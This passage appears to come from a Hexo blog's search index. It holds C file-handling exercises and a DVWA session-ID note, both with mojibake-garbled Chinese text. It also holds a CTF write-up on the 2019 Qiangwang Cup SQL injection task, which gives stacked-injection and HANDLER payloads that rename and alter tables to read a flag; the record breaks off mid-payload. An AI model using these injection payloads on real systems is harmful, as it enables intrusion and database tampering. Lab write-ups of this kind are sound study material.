php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">mt_rand</span>() . <span class="title function_ invoke__">time</span>() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†sessionè®¾ç½®éšæœºæ•°åŠ æ—¶æœºæˆ³åŠ ä¸Šâ€Impossibleâ€æœ€ååˆ©ç”¨sha1è¿›è¡ŒåŠ å¯†éå¸¸çš„å®‰å…¨å•Šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cè¯­è¨€</title>
      <link href="/2023/12/29/c%E8%AF%AD%E8%A8%80/"/>
      <url>/2023/12/29/c%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="8-1"><a href="#8-1" class="headerlink" title="8-1"></a>8-1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line">FILE *i, *fp;</span><br><span class="line">i = fopen(<span class="string">&quot;d:\\data\\sy8-1-out.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">ch = getchar();</span><br><span class="line"><span class="keyword">while</span> (ch != <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">fputc(ch, i);</span><br><span class="line">ch = getchar();</span><br><span class="line">&#125;</span><br><span class="line">fclose(i);</span><br><span class="line">i = fopen(<span class="string">&quot;d:\\data\\sy8-1-out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fp = fopen(<span class="string">&quot;d:\\data\\sy8-1-out1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">ch = fgetc(i);</span><br><span class="line"><span class="keyword">if</span> (feof(i))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (ch &lt;= <span class="string">&#x27;z&#x27;</span> &amp;&amp; ch &gt;= <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">ch -= <span class="number">32</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">fputc(ch, fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(i);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8-2"><a href="#8-2" class="headerlink" title="8-2"></a>8-2</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, n = <span class="number">10</span>, t, j, s = <span class="number">0</span>, arr[<span class="number">10</span>];</span><br><span class="line"><span class="type">float</span> f;</span><br><span class="line">FILE *fp1, *fp2;</span><br><span class="line">fp1 = fopen(<span class="string">&quot;d:\\data\\sy8-2-in.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fp2 = fopen(<span class="string">&quot;d:\\data\\sy8-2-out.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">fscanf</span>(fp1, <span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class="line">t = arr[i];</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line">arr[j] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">s += arr[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line"><span class="built_in">fprintf</span>(fp2, <span class="string">&quot;%d&quot;</span>, arr[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">f = (<span class="type">float</span>)s / <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(fp2, <span class="string">&quot;\n%.2f&quot;</span>, f);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%.2f&quot;</span>, f);</span><br><span class="line">fclose(fp1);</span><br><span class="line">fclose(fp2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8-3"><a href="#8-3" class="headerlink" title="8-3"></a>8-3</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="type">char</span> num[<span class="number">11</span>];</span><br><span class="line"><span class="type">char</span> name[<span class="number">11</span>];</span><br><span class="line"><span class="type">float</span> c[<span class="number">3</span>];</span><br><span class="line"><span class="type">float</span> j;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">input_data</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">float</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt; n; i++) &#123;</span><br><span class="line">s = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%s%f%f%f&quot;</span>, &amp;stu[i].num, &amp;stu[i].name, &amp;stu[i].c[<span class="number">0</span>], &amp;stu[i].c[<span class="number">1</span>], &amp;stu[i].c[<span class="number">2</span>]);</span><br><span class="line">s += stu[i].c[<span class="number">0</span>] + stu[i].c[<span class="number">1</span>] + stu[i].c[<span class="number">2</span>];</span><br><span class="line">stu[i].j = s / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">t</span>;</span></span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (stu[i].j &gt; stu[j].j) &#123;</span><br><span class="line">t = stu[j];</span><br><span class="line">stu[j] = stu[i];</span><br><span class="line">stu[i] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n, <span class="type">char</span> filename[])</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">FILE *fp;</span><br><span class="line">fp = fopen(filename, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">fwrite(&amp;stu[i], <span class="keyword">sizeof</span>(<span class="keyword">struct</span> student), <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">char</span> filename[])</span> &#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">FILE *fp = fopen(filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (fread(&amp;stu[n], <span class="keyword">sizeof</span>(<span class="keyword">struct</span> student), <span class="number">1</span>, fp) == <span class="number">1</span>) &#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="keyword">return</span> n ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insert</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n, <span class="keyword">struct</span> student x)</span> &#123;</span><br><span class="line"><span class="type">int</span> i = n - <span class="number">1</span>;</span><br><span class="line">x.j = (x.c[<span class="number">0</span>] + x.c[<span class="number">1</span>] + x.c[<span class="number">2</span>]) / <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; x.j &lt; stu[i].j) &#123;</span><br><span class="line">stu[i + <span class="number">1</span>] = stu[i];</span><br><span class="line">i--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stu[i + <span class="number">1</span>] = x;</span><br><span class="line"><span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_data</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %s %.2f %.2f %.2f %.2f\n&quot;</span>, stu[i].num, stu[i].name, stu[i].c[<span class="number">0</span>], stu[i].c[<span class="number">1</span>], stu[i].c[<span class="number">2</span>], stu[i].j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[100];</span></span><br><span class="line">input_data(stu, n);</span><br><span class="line">sort(stu, n);</span><br><span class="line">save(stu, n, <span class="string">&quot;d:\\data\\sy8-3-in.txt&quot;</span>);</span><br><span class="line">print_data(stu, n);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">x</span>;</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%s%f%f%f&quot;</span>, &amp;x.num, &amp;x.name, &amp;x.c[<span class="number">0</span>], &amp;x.c[<span class="number">1</span>], &amp;x.c[<span class="number">2</span>]);</span><br><span class="line">n = insert(stu, n, x);</span><br><span class="line">save(stu, n, <span class="string">&quot;d:\\data\\sy8-3-out.txt&quot;</span>);</span><br><span class="line">n = read(stu, <span class="string">&quot;d:\\data\\sy8-3-out.txt&quot;</span>);</span><br><span class="line">print_data(stu, n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8-4"><a href="#8-4" class="headerlink" title="8-4"></a>8-4</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="type">char</span> num[<span class="number">11</span>];</span><br><span class="line"><span class="type">char</span> name[<span class="number">11</span>];</span><br><span class="line"><span class="type">float</span> c[<span class="number">3</span>];</span><br><span class="line"><span class="type">float</span> j;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line"><span class="type">char</span> num[<span class="number">11</span>];</span><br><span class="line"><span class="type">char</span> name[<span class="number">11</span>];</span><br><span class="line"><span class="type">float</span> c[<span class="number">3</span>];</span><br><span class="line"><span class="type">float</span> j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> node *<span class="title function_">create</span><span class="params">(<span class="type">char</span> filename[])</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, n = <span class="number">3</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">h</span>, *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">h = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">h-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">t</span>;</span></span><br><span class="line">FILE *fp = fopen(filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; fread(&amp;t, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> student), <span class="number">1</span>, fp) == <span class="number">1</span>;) &#123;</span><br><span class="line">p = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line"><span class="built_in">strcpy</span>(p-&gt;num, t.num);</span><br><span class="line"><span class="built_in">strcpy</span>(p-&gt;name, t.name);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">p-&gt;c[i] = t.c[i];</span><br><span class="line">p-&gt;j = t.j;</span><br><span class="line">p-&gt;next = h-&gt;next;</span><br><span class="line">h-&gt;next = p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> node *h)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">p</span>;</span></span><br><span class="line">p = h-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %s %f %f %f %f\n&quot;</span>, p-&gt;num, p-&gt;name, p-&gt;c[<span class="number">0</span>], p-&gt;c[<span class="number">1</span>], p-&gt;c[<span class="number">2</span>], p-&gt;j);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">h</span>;</span></span><br><span class="line">h = create(<span class="string">&quot;d:\\data\\sy8-3-out.txt&quot;</span>);</span><br><span class="line">print(h);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuä¸Šçš„ä¸€äº›é¢˜ç›®</title>
      <link href="/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="å¼ºç½‘æ¯2019éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯2019éšä¾¿æ³¨" class="headerlink" title="å¼ºç½‘æ¯2019éšä¾¿æ³¨"></a>å¼ºç½‘æ¯2019éšä¾¿æ³¨</h1><p>è¿™é“é¢˜ç›®æˆ‘ä»¬è¿›è¡Œå¸¸è§„çš„ä¸€äº›å°è¯•å‘ç°æ—¶æ˜¯<code>&#39;</code>é—­åˆçš„æ³¨å…¥æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº›å¸¸è§„çš„æ“ä½œï¼Œä½†æ˜¯å½“æˆ‘ä»¬è¾“å…¥selectæ˜¯å‘ç°selectæ¯è¿‡æ»¤äº†ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¿½ç•¥å¤§å°å†™çš„è¿‡æ»¤ã€‚å‘ç°æ€ä¹ˆä¹Ÿç»•ä¸è¿‡ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨å †å æ³¨å…¥ï¼Œå †å æ³¨å…¥çš„åŸç†åœ¨sqli-labsä¸­ä¹Ÿå¤§è‡´å­¦è¿‡äº†åªæ˜¯å­¦çš„å¾ˆæµ…ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨å †å æ³¨å…¥æ¥æŸ¥çœ‹è¯¥æ•°æ®åº“çš„å†…å®¹ã€‚<br>1.show tablesçˆ†è¡¨åã€‚<br>è¡¨åä¸ºwordså’Œä¸€ä¸²æ•°å­—ã€‚<br>2.show columns from words;show columns from `1919810931114514`<br>wordsçš„å†…å®¹ä¸º<br><img src="/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/1.png" class="" title="Alt text"><br>è¿™æ—¶å€™æˆ‘ä»¬ä¸å¦¨çŒœæµ‹wordsçš„idå°±æ˜¯æˆ‘ä»¬åœ¨æœç´¢æ¡†è¾“å…¥çš„1ï¼Œwordsçš„dataå°±æ˜¯æˆ‘ä»¬æœç´¢åˆ°çš„å†…å®¹<br>1919810931114514çš„å†…å®¹<br><img src="/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/1-2.png" class="" title="Alt text"><br>æˆ‘ä»¬æŸ¥åˆ°flagåœ¨1919810931114514é‡Œï¼Œä½†æ˜¯ä¸€ä¸ªé—®é¢˜å°±æ˜¯selectè¢«ç¦äº†æˆ‘ä»¬è¯¥æ€ä¹ˆæŸ¥è¯¢è¿™ä¸ªè¡¨ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç½‘é¡µè‡ªå¸¦çš„æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸€ä¸‹æŸ¥è¯¢è¯­å¥ä¸º<code>select data from words where id=&#39;$inject&#39;</code>è¿™æ—¶å€™æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨å †å æ³¨å…¥å°†wordséšä¾¿æ”¹ä¸ªåå­—ï¼Œå°†1919810931114514æ”¹ä¸ºwordsï¼Œç„¶åå†å°†flagæ”¹ä¸ºdataï¼Œç»™è¢«æ”¹ä¸ºwordsçš„1919810931114514é‡ŒåŠ ä¸€ä¸ªä¼šè‡ªå¢çš„idï¼Œè¿™æ—¶å€™æˆ‘ä»¬å†æœç´¢æ¡†è¾“å…¥1æ—¶è¾“å‡ºçš„å…¶å®æ—¶flagå†ç¬¬ä¸€è¡Œçš„å†…å®¹ã€‚<br>æ³¨æ„æˆ‘ä»¬éœ€è¦å°†ä½¿ç”¨è¯­å¥å†™æˆä¸€è¡Œå› ä¸ºå¦‚æœå…ˆå°†wordsè¿›è¡Œæ”¹åï¼Œé‚£ä¹ˆåç«¯çš„æŸ¥è¯¢è¯­å¥ä¼šå› ä¸ºæ— æ³•æŸ¥è¯¢åˆ°wordsè€Œæ— æ³•è¿è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table words to a;rename table `1919810931114514` to words;alter table words change flag data varchar(100);alter table words add id int unsigned not Null auto_increment primary key--+</span><br></pre></td></tr></table></figure><br><img src="/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/1-3.png" class=""><br>å¾—åˆ°flag</p><h2 id="æ³•äºŒä½¿ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡"><a href="#æ³•äºŒä½¿ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡" class="headerlink" title="æ³•äºŒä½¿ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡"></a>æ³•äºŒä½¿ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡</h2><h2 id="æ³•ä¸‰ä½¿ç”¨handlerè¿›è¡ŒæŸ¥è¯¢"><a href="#æ³•ä¸‰ä½¿ç”¨handlerè¿›è¡ŒæŸ¥è¯¢" class="headerlink" title="æ³•ä¸‰ä½¿ç”¨handlerè¿›è¡ŒæŸ¥è¯¢"></a>æ³•ä¸‰ä½¿ç”¨handlerè¿›è¡ŒæŸ¥è¯¢</h2><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handler table_name <span class="keyword">open</span>;handler table_name read <span class="keyword">first</span>;handler table_name <span class="keyword">close</span>;#é¦–å…ˆæ‰“å¼€æ•°æ®åº“ï¼Œå¼€å§‹è¯»å®ƒç¬¬ä¸€è¡Œæ•°æ®ï¼Œè¯»å–æˆåŠŸåè¿›è¡Œå…³é—­æ“ä½œã€‚</span><br><span class="line">handler table_name <span class="keyword">open</span>;handler table_name read next;handler table_name <span class="keyword">close</span>;#é¦–å…ˆæ‰“å¼€æ•°æ®åº“ï¼Œå¼€å§‹å¾ªç¯è¯»å–ï¼Œè¯»å–æˆåŠŸåè¿›è¡Œå…³é—­æ“ä½œã€‚</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨handlerè¿›è¡ŒæŸ¥è¯¢è¿›è¡Œè¯»å–flagæ‰€åœ¨çš„è¡¨çš„å†…å®¹ã€‚<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handler <span class="number">1919810931114514</span> <span class="keyword">open</span>;handler <span class="number">1919810931114514</span> read <span class="keyword">first</span>;handler <span class="number">1919810931114514</span> <span 